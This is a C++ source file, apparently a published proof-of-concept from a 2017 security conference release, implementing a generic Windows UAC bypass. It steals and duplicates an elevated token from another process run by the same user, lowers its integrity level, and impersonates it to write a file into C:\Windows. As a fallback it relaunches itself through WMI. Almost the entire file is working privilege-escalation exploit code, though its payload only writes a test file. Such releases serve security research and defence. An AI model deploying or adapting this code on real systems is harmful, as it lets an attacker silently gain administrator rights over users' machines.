//    This file is part of Zero Nights 2017 UAC Bypass Releases
//    Copyright (C) James Forshaw 2017
//
//    UAC Bypasses is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    UAC Bypasses is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with UAC Bypasses.  If not, see <http://www.gnu.org/licenses/>.

// Example code to bypass UAC generically on Windows 7+
// assuming the user is a split-token admin and there's
// already any elevated process on the same desktop.

#define _WIN32_DCOM
#include <windows.h>
#include <comdef.h>
#include <wbemidl.h>
#include <iostream>
#include <memory>
#include <TlHelp32.h>
#include <sddl.h>
#include <vector>
#include <sddl.h>
#pragma comment(lib, "wbemuuid.lib")

_COM_SMARTPTR_TYPEDEF(IWbemLocator, IID_IWbemLocator);
_COM_SMARTPTR_TYPEDEF(IWbemServices, IID_IWbemServices);
_COM_SMARTPTR_TYPEDEF(IWbemClassObject, IID_IWbemClassObject);

using namespace std;

class WrappedError
{
  LPCWSTR _error_msg;
  HRESULT _hr;
public:
  WrappedError(LPCWSTR error_msg, HRESULT hr) {
    _error_msg = error_msg;
    _hr = hr;
  }

  bstr_t ErrorMessage() const {
    return bstr_t(_error_msg) + L"\r\n" + _com_error(_hr).ErrorMessage();
  }
};

void FatalError(LPCWSTR message, DWORD exit_code) {
  ::MessageBox(nullptr, message, L"Error", MB_OK | MB_ICONERROR);
  ::ExitProcess(exit_code);
}

void FatalError(const WrappedError& err, DWORD exit_code) {
  FatalError(err.ErrorMessage(), exit_code);
}

void ShowInfo(bstr_t message) {
  ::MessageBox(nullptr, message, L"Info", MB_OK | MB_ICONINFORMATION);
}

HRESULT Check(HRESULT hr, LPCWSTR error_msg) {
  if (FAILED(hr)) {
    throw WrappedError(error_msg, hr);
  }

  return hr;
}

void ThrowWin32Error(LPCWSTR error_msg) {
  throw WrappedError(error_msg, HRESULT_FROM_WIN32(::GetLastError()));
}

class CoInit {
public:
  CoInit() {
    Check(::CoInitializeEx(nullptr, COINIT_MULTITHREADED), L"CoInitializeEx Failed");
    Check(::CoInitializeSecurity(nullptr,
      -1,
      nullptr,
      nullptr,
      RPC_C_AUTHN_LEVEL_CALL,
      RPC_C_IMP_LEVEL_IMPERSONATE,
      nullptr,
      EOAC_DYNAMIC_CLOAKING,
      nullptr), L"CoInitializeSecurity Failed");
  }
};

class ScopedHandle {
  HANDLE _h;
public:
  ScopedHandle() : ScopedHandle(nullptr) {}
  ScopedHandle(HANDLE h) {
    _h = h;
  }
  ~ScopedHandle() {
    if (valid()) {
      ::CloseHandle(_h);
    }
  }

  ScopedHandle(ScopedHandle&& handle) {
    _h = handle._h;
    handle._h = nullptr;
  }

  ScopedHandle(const ScopedHandle& handle) = delete;
  ScopedHandle& operator=(const ScopedHandle& left) = delete;

  HANDLE get() const {
    return _h;
  }

  PHANDLE ptr() {
    return &_h;
  }

  bool valid() {
    return _h != nullptr && _h != INVALID_HANDLE_VALUE;
  }

  ScopedHandle Duplicate() {
    ScopedHandle ret;
    if (!::DuplicateHandle(::GetCurrentProcess(), _h,
      ::GetCurrentProcess(), ret.ptr(), 0, FALSE, DUPLICATE_SAME_ACCESS)) {
      ThrowWin32Error(L"Error duplicating handle");
    }
    return ret;
  }
};

class ScopedImpersonation {
public:
  ScopedImpersonation(const ScopedHandle& token) {
    if (!::ImpersonateLoggedOnUser(token.get())) {
      ThrowWin32Error(L"Error impersonating user");
    }
  }
  ~ScopedImpersonation() {
    ::RevertToSelf();
  }
  ScopedImpersonation(const ScopedImpersonation&) = delete;
  ScopedImpersonation& operator=(const ScopedImpersonation&) = delete;

  SECURITY_IMPERSONATION_LEVEL GetImpersonationLevel() {
    ScopedHandle token;
    if (!::OpenThreadToken(::GetCurrentThread(), TOKEN_QUERY, TRUE, token.ptr())) {
      ThrowWin32Error(L"Error opening thread token");
    }
    SECURITY_IMPERSONATION_LEVEL level;
    DWORD return_length;
    if (!::GetTokenInformation(token.get(), TokenImpersonationLevel, &level, sizeof(level), &return_length)) {
      ThrowWin32Error(L"Error getting token impersonation level");
    }
    return level;
  }
};

bool IsElevated(const ScopedHandle& token) {
  TOKEN_ELEVATION elevation = {};
  DWORD return_length;
  if (!::GetTokenInformation(token.get(), TokenElevation,
    &elevation, sizeof(elevation), &return_length)) {
    ThrowWin32Error(L"Error getting token elevation");
  }

  return elevation.TokenIsElevated != 0;
}

void SetIntegrityLevel(const ScopedHandle& token, DWORD il) {
  PSID il_sid;
  SID_IDENTIFIER_AUTHORITY label_auth = SECURITY_MANDATORY_LABEL_AUTHORITY;

  if (!::AllocateAndInitializeSid(&label_auth, 1, il, 0, 0, 0, 0, 0, 0, 0, &il_sid)) {
    ThrowWin32Error(L"Error allocating IL SID");
  }

  unique_ptr<void, void(*)(void*)> sid(il_sid, [](void*sid) { FreeSid(sid); });
  TOKEN_MANDATORY_LABEL label = {};
  label.Label.Sid = il_sid;
  if (!::SetTokenInformation(token.get(), TokenIntegrityLevel, &label, sizeof(label))) {
    ThrowWin32Error(L"Error setting token integrity level");
  }
}

ScopedHandle DuplicateForImpersonate(const ScopedHandle& token) {
  ScopedHandle dup_token;
  if (!::DuplicateTokenEx(token.get(), TOKEN_ALL_ACCESS, nullptr,
    SecurityImpersonation, TokenImpersonation, dup_token.ptr())) {
    ThrowWin32Error(L"Error duplicating token for impersonation");
  }
  return dup_token;
}

bool RunUnderImpersonation(const ScopedHandle& token, void(*run_under_imp)()) {
  ScopedImpersonation imp(token);

  if (imp.GetImpersonationLevel() != SecurityImpersonation) {
    return false;
  }

  run_under_imp();
  return true;
}

bstr_t GetProcessFileName() {
  WCHAR buf[MAX_PATH];
  if (GetModuleFileName(nullptr, buf, MAX_PATH) == 0) {
    ThrowWin32Error(L"Error getting main module path");
  }
  return buf;
}

void RestartProcessWithWmi() {
  CoInit ci;
  IWbemLocatorPtr locator;

  ShowInfo(L"Restarting process using WMI");

  Check(CoCreateInstance(CLSID_WbemLocator, 0,
    CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&locator)),
    L"Failed to create IWbemLocator object");

  IWbemServicesPtr services;
  Check(locator->ConnectServer(bstr_t(L"root\\cimv2"),
    nullptr, nullptr, nullptr, 0, nullptr, nullptr, &services)
    , L"Error connecting to WMI server");

  bstr_t method_name(L"Create");
  bstr_t class_name(L"Win32_Process");

  IWbemClassObjectPtr process_class;
  Check(services->GetObject(class_name, 0, nullptr, &process_class, nullptr),
    L"Error getting Win32_Process class object");

  IWbemClassObjectPtr in_params_class;
  Check(process_class->GetMethod(method_name, 0,
    &in_params_class, nullptr), L"Error getting method parameters");

  IWbemClassObjectPtr in_params;
  Check(in_params_class->SpawnInstance(0, &in_params),
    L"Error spawning instance of parameters");

  bstr_t cmdline_str = L"\"" + GetProcessFileName() + L"\" -restart";

  wcout << (LPCWSTR)cmdline_str << endl;

  variant_t cmdline(cmdline_str);
  Check(in_params->Put(L"CommandLine", 0,
    &cmdline, 0), L"Error setting command line parameter");

  IWbemClassObjectPtr out_params;
  Check(services->ExecMethod(class_name, method_name, 0,
    nullptr, in_params, &out_params, nullptr),
    L"Error executing Win32_Process::Create method");

  variant_t ret_value;
  Check(out_params->Get(_bstr_t(L"ReturnValue"), 0,
    &ret_value, nullptr, nullptr),
    L"Error getting return value");

  if ((int)ret_value != 0) {
    FatalError(bstr_t(L"Process creation returned unexpected error: ") + (bstr_t)ret_value, 1);
  }
}

void RunUnderElevatedToken() {
  SECURITY_ATTRIBUTES sa = {};
  sa.nLength = sizeof(sa);
  ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;;GA;;;WD)", SDDL_REVISION_1, &sa.lpSecurityDescriptor, nullptr);
  ScopedHandle handle(::CreateFile(L"C:\\Windows\\test.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE,
    &sa, CREATE_ALWAYS, 0, nullptr));
  if (handle.valid()) {
    const char* str = "Hello World!";
    DWORD bytes_written = 0;
    ::WriteFile(handle.get(), str, static_cast<DWORD>(strlen(str)), &bytes_written, nullptr);
    ShowInfo(L"Created file in privileged location");
  }
  else {
    ThrowWin32Error(L"Error creating privileged file");
  }
}

bstr_t GetTokenUser(const ScopedHandle& token) {
  vector<char> buf;
  DWORD ret_length = 0;
  ::GetTokenInformation(token.get(), TokenUser, nullptr, 0, &ret_length);
  buf.resize(ret_length);
  if (!::GetTokenInformation(token.get(), TokenUser, buf.data(), ret_length, &ret_length)) {
    ThrowWin32Error(L"Error getting token user");
  }
  PTOKEN_USER token_user = reinterpret_cast<PTOKEN_USER>(buf.data());
  LPWSTR sid;
  if (!::ConvertSidToStringSid(token_user->User.Sid, &sid)) {
    ThrowWin32Error(L"Error converting SID to string");
  }

  std::unique_ptr<void, void(*)(void*)> deleter(sid, [](void*p) { ::LocalFree(p); });
  return sid;
}

bstr_t GetCurrentTokenUser() {
  ScopedHandle token;
  if (!::OpenProcessToken(::GetCurrentProcess(), TOKEN_QUERY, token.ptr())) {
    ThrowWin32Error(L"Error opening current process token");
  }
  return GetTokenUser(token);
}

ScopedHandle FindElevatedToken() {
  bstr_t current_user = GetCurrentTokenUser();
  ScopedHandle snapshot(::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
  if (!snapshot.valid()) {
    ThrowWin32Error(L"Error creating process snapshot");
  }
  PROCESSENTRY32 proc_entry = {};
  proc_entry.dwSize = sizeof(proc_entry);

  if (::Process32First(snapshot.get(), &proc_entry)) {
    do {
      ScopedHandle process(::OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, proc_entry.th32ProcessID));
      if (!process.valid()) {
        continue;
      }
      ScopedHandle token;
      if (!::OpenProcessToken(process.get(), TOKEN_DUPLICATE | TOKEN_QUERY, token.ptr())) {
        continue;
      }

      if (IsElevated(token) && current_user == GetTokenUser(token)) {
        bstr_t message = L"Found elevated process ";
        message += proc_entry.szExeFile;
        ShowInfo(message);
        return token;
      }
    } while (proc_entry.dwSize = sizeof(proc_entry), ::Process32Next(snapshot.get(), &proc_entry));
  }
  return nullptr;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
  _In_opt_ HINSTANCE hPrevInstance,
  _In_ LPWSTR    lpCmdLine,
  _In_ int       nCmdShow) {
  try {
    ScopedHandle token = FindElevatedToken();
    if (!token.valid()) {
      FatalError(L"Couldn't find an elevated token running as the same user", 1);
    }

    if (!IsElevated(token)) {
      FatalError(L"Specified process token is not elevated, aborting", 1);
    }

    ScopedHandle imp_token = DuplicateForImpersonate(token);
    SetIntegrityLevel(imp_token, SECURITY_MANDATORY_MEDIUM_RID);

    if (RunUnderImpersonation(imp_token,
      RunUnderElevatedToken)) {
      return 0;
    }

    if (wcslen(lpCmdLine) > 0) {
      FatalError(L"Caller specified restart mode, we can't continue", 1);
    }

    ScopedHandle lua_token;
    if (!::CreateRestrictedToken(imp_token.get(), LUA_TOKEN, 0, nullptr, 0, nullptr, 0, nullptr, lua_token.ptr())) {
      ThrowWin32Error(L"Error creating restricted token");
    }

    if (IsElevated(lua_token)) {
      FatalError(L"Something went wrong, didn't remove elevation level from token.", 1);
    }

    if (!RunUnderImpersonation(lua_token, RestartProcessWithWmi)) {
      FatalError(L"Error impersonating LUA token", 1);
    }
  }
  catch (const WrappedError& err) {
    FatalError(err, 1);
  }
  return 0;
}

